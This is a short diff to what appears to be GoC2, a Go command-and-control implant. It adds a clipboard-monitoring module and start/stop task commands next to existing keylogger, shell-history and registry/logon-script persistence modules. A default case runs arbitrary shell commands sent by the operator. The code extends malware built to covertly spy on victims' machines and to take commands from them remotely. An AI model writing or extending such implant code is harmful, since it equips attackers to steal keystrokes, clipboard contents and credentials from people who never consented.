@@ -50,6 +50,7 @@ import (
 	"github.com/latortuga71/GoC2/internal/modules/persistence/logonscript"
 	"github.com/latortuga71/GoC2/internal/modules/persistence/powershellprofile"
 	"github.com/latortuga71/GoC2/internal/modules/persistence/runkey"
+	"github.com/latortuga71/GoC2/internal/modules/privilegeescalation/clipboardmonitor"
 	"github.com/latortuga71/GoC2/internal/modules/privilegeescalation/goup"
 	"github.com/latortuga71/GoC2/internal/modules/privilegeescalation/keylogger"
 	"github.com/latortuga71/GoC2/internal/modules/privilegeescalation/shellhistory"
@@ -268,6 +269,11 @@ func ClientHandleTask(message []byte) (error, *data.TaskResult) {
 		result, cmdError = "[+] Started keylogger service", nil
 	case "stop-keylogger":
 		result, cmdError = keylogger.StopKeyLogger()
+	case "start-clipboard-monitor":
+		go clipboardmonitor.StartClipboardMonitor()
+		result, cmdError = "[+] Started clipboard service", nil
+	case "stop-clipboard-monitor":
+		result, cmdError = clipboardmonitor.StopClipboardMonitor()
 	default:
 		result, cmdError = basic.ShellCommand(t.Args)
 	}
